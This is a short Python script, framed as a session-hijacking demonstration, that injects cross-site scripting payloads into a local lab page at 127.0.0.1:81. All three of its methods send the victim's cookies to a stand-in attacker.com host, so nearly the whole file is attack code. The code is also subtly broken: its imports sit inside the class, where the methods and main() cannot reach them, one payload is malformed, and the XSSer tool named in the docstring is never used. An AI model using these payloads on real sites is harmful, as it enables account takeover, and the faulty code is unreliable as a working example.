class SessionHijacking:

    """
    Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications.
    This Python class demonstrates session hijacking using the XSSer tool.
    Description: This class contains methods to exploit XSS vulnerabilities in a target at http://127.0.0.1:81/vulnerabilities/xss_d/.
    """

    import requests
    from bs4 import BeautifulSoup

    def exploit_xsser_1(self, s):
        response = s.get('http://127.0.0.1:81/vulnerabilities/xss_d/')
        soup = BeautifulSoup(response.text, 'html.parser')
        session_cookie = s.cookies['SESSION']
        payload = f"<script>document.location = 'http://attacker.com/steal?cookie=' + document.cookie;</script>"
        form = soup.find('form')
        action = form['action']
        payload_data = {
            'txtName': payload, 
            'txtName_original': 'Original Name',
            'type': 'submit'
        }
        s.post(action, data=payload_data)

    def exploit_xsser_2(self, s):
        payload = "<script>new Image().src='http://attacker.com/steal?cookie=' + document.cookie;</script>"
        s.get(f'http://127.0.0.1:81/vulnerabilities/xss_d/?test={payload}')

    def exploit_xsser_3(self, s):
        payload = "<img src='http://attacker.com/steal?cookie=' + document.cookie + '>"
        s.get(f'http://127.0.0.1:81/vulnerabilities/xss_d/?search="{payload}"')

def main():
    with requests.Session() as s:
        hijacker = SessionHijacking()
        hijacker.exploit_xsser_1(s)
        hijacker.exploit_xsser_2(s)
        hijacker.exploit_xsser_3(s)

if __name__ == "__main__":
    main()
